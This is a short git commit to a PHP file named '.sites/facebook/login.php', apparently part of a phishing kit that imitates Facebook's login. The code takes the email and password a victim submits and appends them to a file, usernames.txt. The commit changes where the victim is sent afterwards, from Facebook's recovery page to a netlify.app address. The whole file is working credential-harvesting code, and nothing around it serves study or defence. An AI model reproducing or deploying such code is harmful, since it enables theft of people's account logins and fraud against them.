f9e68af91d3f2f1b7a82b470cd666c27bf7dd1fb
Aduvi1 <82288774+Aduvi1@users.noreply.github.com>
2021-04-12 08:12:40 -0500

    Update login.php

--- .sites/facebook/login.php
+++ .sites/facebook/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://sad-stonebraker-fe825f.netlify.app/');
 exit();
 ?>
